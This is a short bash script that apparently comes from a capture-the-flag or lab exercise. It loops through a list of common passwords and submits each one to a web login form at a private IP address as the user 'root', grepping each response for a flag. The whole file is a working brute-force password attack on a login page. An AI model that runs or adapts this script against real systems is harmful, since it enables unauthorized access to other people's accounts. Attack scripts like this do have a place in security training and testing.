
pws=(123456 password 987654321 654321 12345678 12345679 qwerty qwertyuiop abc123 1q2w3e4r 1q2w3e4r5t 123456789 111111 555555 666666 7777777 1234567 iloveyou adobe123 18atcskd2w 3rjs1la7qe 123123 Admin 1234567890 letmein photoshop 1234 monkey shadow sunshine google 12345 password1 princess azerty trustno1 mynoob 000000)
user="root"
for pw in ${pws[@]}; do
	curl -X POST "http://192.168.40.128/index.php?page=signin&username=${user}&password=${pw}&Login=Login#" | grep 'flag'
done